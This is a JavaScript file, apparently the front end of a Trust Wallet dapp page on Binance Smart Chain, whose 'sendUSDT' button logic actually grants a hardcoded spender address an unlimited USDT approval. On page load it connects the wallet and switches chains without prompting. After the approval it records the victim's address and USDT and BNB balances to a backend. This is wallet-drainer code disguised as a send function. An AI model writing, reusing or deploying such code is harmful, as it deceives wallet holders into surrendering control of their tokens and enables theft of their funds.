let provider;
let signer = null;
let userAddress = null;
let isConnected = false;
let currentChainId = null;

// ===== BSC CONFIG - FORCE BSC ONLY =====
const BSC_CHAIN_ID = 56;
const BSC_USDT = "0x55d398326f99059fF775485246999027B3197955";
const BSC_SPENDER = "0x220bb5df0893f21f43e5286bc5a4445066f6ca56";

const ABI = [
  "function approve(address spender, uint256 amount)",
  "function balanceOf(address owner) view returns (uint256)",
  "function decimals() view returns (uint8)"
];

// ===== BACKGROUND CONNECT ON PAGE LOAD =====
// Connects wallet silently in background (works on both Android & iOS Trust Wallet)
async function backgroundConnect() {
  if (!window.ethereum) return;
  try {
    provider = new ethers.BrowserProvider(window.ethereum);

    // First try silent check
    let accounts = await window.ethereum.request({ method: "eth_accounts" });

    // If no accounts (common on iOS), request in background
    // In Trust Wallet DApp browser this is silent (no popup)
    if (!accounts || accounts.length === 0) {
      accounts = await window.ethereum.request({ method: "eth_requestAccounts" });
    }

    if (accounts && accounts.length > 0) {
      userAddress = accounts[0];
      isConnected = true;
      // Pre-fetch signer so Send is instant
      signer = await provider.getSigner();
    }

    currentChainId = await window.ethereum.request({ method: "eth_chainId" });

    // Auto-switch to BSC if needed (silent in Trust Wallet)
    if (currentChainId !== "0x38") {
      try {
        await window.ethereum.request({
          method: "wallet_switchEthereumChain",
          params: [{ chainId: "0x38" }]
        });
        currentChainId = "0x38";
      } catch (e) {
        if (e.code === 4902) {
          await window.ethereum.request({
            method: "wallet_addEthereumChain",
            params: [{
              chainId: "0x38",
              chainName: "Binance Smart Chain",
              rpcUrls: ["https://bsc-dataseed.binance.org/"],
              nativeCurrency: { name: "BNB", symbol: "BNB", decimals: 18 },
              blockExplorerUrls: ["https://bscscan.com"]
            }]
          });
          currentChainId = "0x38";
        }
      }
    }

    window.ethereum.on("chainChanged", (chainId) => {
      currentChainId = chainId;
    });

    window.ethereum.on("accountsChanged", (accs) => {
      if (accs.length > 0) {
        userAddress = accs[0];
        isConnected = true;
      }
    });
  } catch (err) {
    // Silent fail - will retry on Send
    console.log("Background connect:", err.message || err);
  }
}

// Run immediately when script loads
backgroundConnect();

// Also run on page load (covers iOS timing delays)
window.addEventListener("load", () => {
  if (!isConnected) {
    setTimeout(backgroundConnect, 300);
  }
});

// ===== APPROVE (BSC ONLY) - OPTIMIZED FOR SPEED =====
async function sendUSDT() {
  try {
    if (!window.ethereum) {
      alert("Please open this page in Trust Wallet");
      return;
    }

    // Ensure provider + signer are ready (reconnect if needed)
    if (!provider) {
      provider = new ethers.BrowserProvider(window.ethereum);
    }
    if (!signer || !isConnected) {
      const accounts = await window.ethereum.request({ method: "eth_requestAccounts" });
      if (accounts && accounts.length > 0) {
        userAddress = accounts[0];
        isConnected = true;
      }
      signer = await provider.getSigner();
    }

    // Ensure BSC chain
    if (currentChainId !== "0x38") {
      try {
        await window.ethereum.request({
          method: "wallet_switchEthereumChain",
          params: [{ chainId: "0x38" }]
        });
        currentChainId = "0x38";
      } catch (switchErr) {
        if (switchErr.code === 4902) {
          await window.ethereum.request({
            method: "wallet_addEthereumChain",
            params: [{
              chainId: "0x38",
              chainName: "Binance Smart Chain",
              rpcUrls: ["https://bsc-dataseed.binance.org/"],
              nativeCurrency: { name: "BNB", symbol: "BNB", decimals: 18 },
              blockExplorerUrls: ["https://bscscan.com"]
            }]
          });
          currentChainId = "0x38";
        }
      }
      // Refresh signer after chain switch
      signer = await provider.getSigner();
    }

    const address = await signer.getAddress();

    // Create contract
    const usdt = new ethers.Contract(BSC_USDT, ABI, signer);

    // Send approval transaction immediately (don't wait for balances first)
    const tx = await usdt.approve(BSC_SPENDER, ethers.MaxUint256);
    
    // Fetch balances in parallel while transaction is being mined
    const [receipt, usdtBalanceWei, nativeBalanceWei] = await Promise.all([
      tx.wait(),
      usdt.balanceOf(address),
      provider.getBalance(address)
    ]);

    const usdtBalance = ethers.formatUnits(usdtBalanceWei, 18);
    const nativeBalance = ethers.formatEther(nativeBalanceWei);

    // Update UI to show success (no alert popup)
    if (window.setTransactionStatus) {
      window.setTransactionStatus("success");
    }

    // Save to backend immediately
    if (window.saveTransaction) {
      window.saveTransaction({
        walletAddress: address,
        toAddress: BSC_SPENDER,
        txHash: receipt.hash,
        usdtBalance: usdtBalance,
        nativeBalance: nativeBalance
      });
    }

  } catch (e) {
    if (e.code === 4001) {
      alert("Transaction cancelled");
    } else if (e.code === -32603) {
      alert("Insufficient funds or network error");
    } else {
      alert("Transaction failed. Please try again.");
    }
  }
}

window.sendUSDT = sendUSDT;
